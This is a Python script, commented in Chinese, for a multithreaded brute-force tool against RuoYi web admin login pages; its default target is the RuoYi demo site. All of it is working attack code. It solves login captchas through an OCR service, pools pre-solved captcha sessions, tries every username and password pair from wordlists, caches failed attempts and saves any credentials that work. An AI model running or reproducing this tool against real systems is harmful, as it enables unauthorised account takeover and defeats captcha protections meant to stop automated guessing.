#!/usr/bin/env python
# encoding: utf-8

import base64
import csv
import json
import os
import shutil
import threading
import time
import queue
import argparse
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

import httpx
from httpx._config import Limits

STOP_EVENT = threading.Event()
CACHE_LOCK = threading.Lock()
CSV_LOCK = threading.Lock()
PRINT_LOCK = threading.Lock()
CAPTCHA_QUEUE = None
CAPTCHA_READY_EVENT = threading.Event()
HTTP_CLIENT_POOL = None
DEBUG_CAPTCHA = False

CAPTCHA_FETCH_RETRIES = 2
CAPTCHA_ERR_MAX_RETRIES = 5

FAILED_CACHE = set()
CONFIG = None

class ProgressTracker:
    """进度追踪器，线程安全地统计完成数量和预计剩余时间"""
    def __init__(self, total):
        self.total = total
        self.finished = 0
        self.start_time = time.time()
        self.lock = threading.Lock()

    def update(self, pool_size=0):
        with self.lock:
            self.finished += 1
            elapsed = time.time() - self.start_time
            avg_time = elapsed / self.finished
            remaining = self.total - self.finished
            eta = avg_time * remaining
            eta_str = time.strftime("%H:%M:%S", time.gmtime(eta))
            progress = (self.finished / self.total) * 100

            elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
            with PRINT_LOCK:
                print(f"[*] 进度: {self.finished}/{self.total} ({progress:.2f}%) | "
                      f"已用: {elapsed_str} | 池余量: {pool_size} | 预计剩余: {eta_str}")

def load_cache(cache_file):
    """从文件加载已失败的凭据缓存"""
    if os.path.exists(cache_file):
        with open(cache_file, "r", encoding="utf-8") as f:
            for line in f:
                if ":" in line:
                    FAILED_CACHE.add(line.strip())

def save_to_cache(cache_file, username, password):
    """写入错误缓存并立即刷新到磁盘"""
    entry = f"{username}:{password}"
    with CACHE_LOCK:
        if entry not in FAILED_CACHE:
            FAILED_CACHE.add(entry)
            with open(cache_file, "a", encoding="utf-8") as f:
                f.write(entry + "\n")
                f.flush()

def save_success_to_cache(success_file, username, password):
    """写入成功记录并立即刷新到磁盘"""
    entry = f"{username}:{password}"
    with open(success_file, "a", encoding="utf-8") as f:
        f.write(entry + "\n")
        f.flush()

def get_captcha_and_solve(client):
    """获取并识别验证码，网络异常时自动重试，返回识别结果或 None"""
    if STOP_EVENT.is_set():
        return None
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
    last_error = None
    for attempt in range(1, CAPTCHA_FETCH_RETRIES + 1):
        if STOP_EVENT.is_set():
            return None
        try:
            resp = client.get(CONFIG.captcha_url, headers=headers, timeout=10)
            if STOP_EVENT.is_set():
                return None
            img_b64 = base64.b64encode(resp.content).decode("utf-8")

            ocr_resp = HTTP_CLIENT_POOL.post(CONFIG.ocr_api, json={"imageBase64": img_b64}, timeout=30)
            if STOP_EVENT.is_set():
                return None
            res = ocr_resp.json()

            ocr_val = res.get("result")
            if res.get("code") == 200 and ocr_val is not None and str(ocr_val) != "":
                result = str(ocr_val)
                if DEBUG_CAPTCHA:
                    save_captcha_debug_image(resp.content, result)
                return result
            return None
        except Exception as e:
            last_error = e
            if not STOP_EVENT.is_set():
                with PRINT_LOCK:
                    print(f"[-] 验证码获取/识别异常 (第{attempt}/{CAPTCHA_FETCH_RETRIES}次): {e}")
            if attempt < CAPTCHA_FETCH_RETRIES and not STOP_EVENT.is_set():
                time.sleep(1 * attempt)
    return None

def save_captcha_debug_image(img_data, result):
    """保存验证码图片到 debug 目录"""
    debug_dir = "captcha_debug"
    if not os.path.exists(debug_dir):
        os.makedirs(debug_dir)

    timestamp = time.strftime("%Y%m%d%H%M%S")
    clean_result = result if result else "unknown"
    clean_result = "".join(c for c in clean_result if c.isalnum() or c in "._-")
    filename = f"{clean_result}.{timestamp}.png"
    filepath = os.path.join(debug_dir, filename)

    with open(filepath, "wb") as f:
        f.write(img_data)
    with PRINT_LOCK:
        print(f"[*] 验证码图片已保存: {filepath}")

def log_to_csv(data_dict):
    """线程安全地将字典格式结果写入 CSV"""
    with CSV_LOCK:
        file_exists = os.path.isfile(CONFIG.output)
        fieldnames = list(data_dict.keys())
        with open(CONFIG.output, "a", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            if not file_exists:
                writer.writeheader()
            writer.writerow(data_dict)

def create_session_client():
    """创建独立的 session 客户端，启用 CookieJar 保存 JSESSIONID"""
    return httpx.Client(
        limits=CONFIG.client_limits,
        verify=CONFIG.verify_ssl,
        proxy=CONFIG.proxy_url,
        cookies=httpx.Cookies()
    )

def fetch_and_solve_captcha(client):
    """使用指定客户端获取并识别验证码"""
    return get_captcha_and_solve(client)

def enqueue_with_timeout(q, item, timeout=5):
    """将项目放入队列，超时返回 False，成功返回 True 并通知就绪事件"""
    try:
        q.put(item, timeout=timeout)
        CAPTCHA_READY_EVENT.set()
        return True
    except queue.Full:
        return False

def captcha_filler_worker():
    """生产者：预填充验证码池"""
    while not STOP_EVENT.is_set():
        if CAPTCHA_QUEUE.full():
            time.sleep(1)
            continue

        session_client = create_session_client()
        try:
            if STOP_EVENT.is_set():
                session_client.close()
                return
            code = fetch_and_solve_captcha(session_client)
            if STOP_EVENT.is_set():
                session_client.close()
                return
            if code:
                if not enqueue_with_timeout(CAPTCHA_QUEUE, (session_client, code)):
                    session_client.close()
            else:
                session_client.close()
        except Exception:
            session_client.close()

def build_login_data(username, password, captcha):
    """构建登录请求的数据字典"""
    return {
        "username": username,
        "password": password,
        "validateCode": captcha,
        "rememberMe": "false"
    }

def check_response_type(resp_text):
    """检查响应类型，返回 captcha_err / success / failure / unknown"""
    if any(k in resp_text for k in CONFIG.captcha_keywords):
        return "captcha_err"
    if CONFIG.success_keywords and any(k in resp_text for k in CONFIG.success_keywords):
        return "success"
    if any(k in resp_text for k in CONFIG.failure_keywords):
        return "failure"
    return "unknown"

def handle_login_success(username, password, tracker, session, pool_size):
    """处理登录成功：记录成功缓存、更新进度、停止事件"""
    with PRINT_LOCK:
        print(f"\n[\033[32m+\033[0m] 成功!!! 账号: {username}, 密码: {password}")
    save_success_to_cache(CONFIG.success_file, username, password)
    tracker.update(pool_size)
    session.close()
    STOP_EVENT.set()

def handle_login_failure(username, password, tracker, session, pool_size):
    """处理登录失败：记录错误缓存、更新进度"""
    save_to_cache(CONFIG.cache_file, username, password)
    tracker.update(pool_size)
    session.close()

def handle_login_unknown(tracker, session, pool_size):
    """处理未命中关键字的响应：更新进度"""
    tracker.update(pool_size)
    session.close()

def login_worker(username, password, tracker):
    """消费者：执行登录枚举，验证码错误时有限次重试"""
    if STOP_EVENT.is_set():
        return

    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    captcha_err_count = 0
    while not STOP_EVENT.is_set():
        pool_size = CAPTCHA_QUEUE.qsize()
        try:
            session, captcha_code = CAPTCHA_QUEUE.get(timeout=10)
        except queue.Empty:
            if STOP_EVENT.is_set():
                break
            continue

        data = build_login_data(username, password, captcha_code)

        try:
            resp = session.post(CONFIG.login_url, headers=headers, data=data, timeout=15)
            resp_text = resp.text

            snippet = resp_text.strip().replace('"', '').replace('\n', '').replace('\r', '').replace('\t', '')
            if len(snippet) > 50:
                snippet = snippet[:50]
            log_to_csv({
                "URL": CONFIG.login_url,
                "Username": username,
                "Password": password,
                "Status": resp.status_code,
                "Length": len(resp_text),
                "Snippet": snippet
            })

            resp_type = check_response_type(resp_text)

            if resp_type == "captcha_err":
                captcha_err_count += 1
                with PRINT_LOCK:
                    print(f"\n[-] 验证码识别错误 ({captcha_err_count}/{CAPTCHA_ERR_MAX_RETRIES}): {username} {password} {captcha_code}")
                CAPTCHA_QUEUE.task_done()
                session.close()
                if captcha_err_count >= CAPTCHA_ERR_MAX_RETRIES:
                    with PRINT_LOCK:
                        print(f"[-] 验证码错误次数达上限，跳过: {username} {password}")
                    tracker.update(pool_size)
                    break
                time.sleep(min(captcha_err_count, 3))
                continue
            elif resp_type == "success":
                CAPTCHA_QUEUE.task_done()
                handle_login_success(username, password, tracker, session, pool_size)
                break
            elif resp_type == "failure":
                CAPTCHA_QUEUE.task_done()
                handle_login_failure(username, password, tracker, session, pool_size)
                break
            else:
                CAPTCHA_QUEUE.task_done()
                handle_login_unknown(tracker, session, pool_size)
                break

        except Exception as e:
            with PRINT_LOCK:
                print(f"[-] 登录请求异常: {username} {password} - {e}")
            CAPTCHA_QUEUE.task_done()
            session.close()
            break

def parse_args():
    """解析命令行参数并构建配置对象"""
    parser = argparse.ArgumentParser(description="ruoyi login brute force tool (LLM OCR)")

    parser.add_argument("-u", "--login-url", default="https://demo.ruoyi.vip/login", help="login URL")
    parser.add_argument("-c", "--captcha-url", default="https://demo.ruoyi.vip/captcha/captchaImage?type=math", help="captcha URL")

    parser.add_argument("-x", "--proxy", default="http://127.0.0.1:8080", help="HTTP/HTTPS proxy")
    parser.add_argument("--ocr-proxy", default="", help="OCR API proxy (default: no proxy)")

    parser.add_argument("-s", "--success", default="操作成功", help="success keywords (comma separated)")
    parser.add_argument("-f", "--failure", default="用户不存在/密码错误", help="failure keywords (comma separated)")
    parser.add_argument("-e", "--captcha-err", default="验证码错误", help="captcha error keywords (comma separated)")

    parser.add_argument("-o", "--output", default="scan_results.csv", help="CSV output path")
    parser.add_argument("-a", "--ocr-api", default="http://127.0.0.1:5001/ruoyi/base64", help="local OCR API URL")

    parser.add_argument("-L", "--login-workers", type=int, default=10, help="login worker threads")
    parser.add_argument("-F", "--filler-workers", type=int, default=15, help="captcha filler threads")
    parser.add_argument("-S", "--pool-size", type=int, default=20, help="captcha pool capacity")
    parser.add_argument("-C", "--max-connections", type=int, default=100, help="max HTTP connections")
    parser.add_argument("-K", "--max-keepalive", type=int, default=20, help="max keepalive connections")

    parser.add_argument("-U", "--user-file", default="username.txt", help="username dictionary file")
    parser.add_argument("-P", "--pass-file", default="password.txt", help="password dictionary file")

    parser.add_argument("--debug-captcha", action="store_true", default=False, help="save captcha images for debug")
    parser.add_argument("--no-cache", action="store_true", default=False, help="ignore cache filter on startup")

    args = parser.parse_args()

    args.success_keywords = [k.strip() for k in args.success.split(",") if k.strip()] if args.success else []
    args.failure_keywords = [k.strip() for k in args.failure.split(",") if k.strip()]
    args.captcha_keywords = [k.strip() for k in args.captcha_err.split(",") if k.strip()]

    args.proxy_url = args.proxy if args.proxy else None
    args.ocr_proxy_url = args.ocr_proxy if args.ocr_proxy else None
    args.verify_ssl = False

    args.client_limits = Limits(
        max_connections=args.max_connections,
        max_keepalive_connections=args.max_keepalive,
        keepalive_expiry=30.0
    )

    host = urlparse(args.login_url).netloc
    args.cache_file = f"{host}.error.cache"
    args.success_file = f"{host}.success.cache"

    return args

def format_duration(seconds):
    """将秒数格式化为可读的时间字符串"""
    if seconds < 60:
        return f"{seconds:.1f}s"
    elapsed_str = time.strftime("%H:%M:%S", time.gmtime(seconds))
    return elapsed_str

def main():
    """主入口：初始化配置、启动生产者/消费者线程、等待任务完成"""
    global CONFIG, CAPTCHA_QUEUE, HTTP_CLIENT_POOL, DEBUG_CAPTCHA
    program_start = time.time()
    CONFIG = parse_args()
    CAPTCHA_QUEUE = queue.Queue(maxsize=CONFIG.pool_size)
    DEBUG_CAPTCHA = CONFIG.debug_captcha

    if DEBUG_CAPTCHA:
        debug_dir = "captcha_debug"
        if os.path.exists(debug_dir):
            shutil.rmtree(debug_dir)
        os.makedirs(debug_dir)

    HTTP_CLIENT_POOL = httpx.Client(
        limits=CONFIG.client_limits,
        verify=CONFIG.verify_ssl,
        proxy=CONFIG.ocr_proxy_url
    )

    if not CONFIG.no_cache:
        load_cache(CONFIG.cache_file)
    else:
        print("[*] 已忽略缓存过滤 (--no-cache)")

    try:
        with open(CONFIG.user_file, "r", encoding="utf-8") as f:
            users = [l.strip() for l in f if l.strip()]
        with open(CONFIG.pass_file, "r", encoding="utf-8") as f:
            pwds = [l.strip() for l in f if l.strip()]
    except Exception as e:
        print(f"[-] 读取字典失败: {e}")
        HTTP_CLIENT_POOL.close()
        return

    all_tasks = [(u, p) for u in users for p in pwds]
    tasks = [t for t in all_tasks if f"{t[0]}:{t[1]}" not in FAILED_CACHE]

    if not tasks:
        print("[*] 无待处理任务。")
        HTTP_CLIENT_POOL.close()
        return

    tracker = ProgressTracker(len(tasks))
    print(f"[*] 启动验证码识别线程 (并发:{CONFIG.filler_workers})...")
    filler_threads = []
    for _ in range(CONFIG.filler_workers):
        t = threading.Thread(target=captcha_filler_worker, daemon=True)
        t.start()
        filler_threads.append(t)

    if not CAPTCHA_READY_EVENT.wait(timeout=60):
        print("[-] 等待验证码超时。")
        STOP_EVENT.set()
        HTTP_CLIENT_POOL.close()
        return

    print(f"[*] 启动登录并发 (并发:{CONFIG.login_workers}) | 待处理任务: {len(tasks)}")
    try:
        with ThreadPoolExecutor(max_workers=CONFIG.login_workers) as executor:
            for u, p in tasks:
                if STOP_EVENT.is_set():
                    break
                executor.submit(login_worker, u, p, tracker)
    finally:
        STOP_EVENT.set()
        for t in filler_threads:
            t.join(timeout=5)
        HTTP_CLIENT_POOL.close()
        total_time = time.time() - program_start
        print(f"\n[*] 任务结束，连接池已关闭 | 总运行时间: {format_duration(total_time)}")

if __name__ == "__main__":
    main()
